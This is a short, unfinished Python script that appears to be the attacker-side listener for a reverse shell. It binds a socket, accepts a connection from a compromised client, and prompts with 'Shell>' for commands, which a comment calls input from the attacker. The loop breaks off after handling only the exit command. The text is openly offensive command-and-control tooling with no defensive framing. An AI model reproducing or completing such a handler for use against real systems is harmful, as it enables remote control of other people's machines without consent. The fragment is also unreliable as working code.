import socket

def Server_Listening(ip, port):
    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # binding the socket to the specified IP address and port
    server_socket.bind((ip, port))
    
    # listening for the incoming connection
    server_socket.listen(3)
    print(f"Listening on {ip}:{port}...")
    
    # Accept a connection from the client
    client_socket, client_address = server_socket.accept()
    print(f"Connection received from {client_address}")
    
    # Entering a loop to receive and send command 
    while True:
        # input from the attacker 
        command = input("Shell>")
        if command.lower() == 'exit':
            client_socket.send(b'exit')
            break
            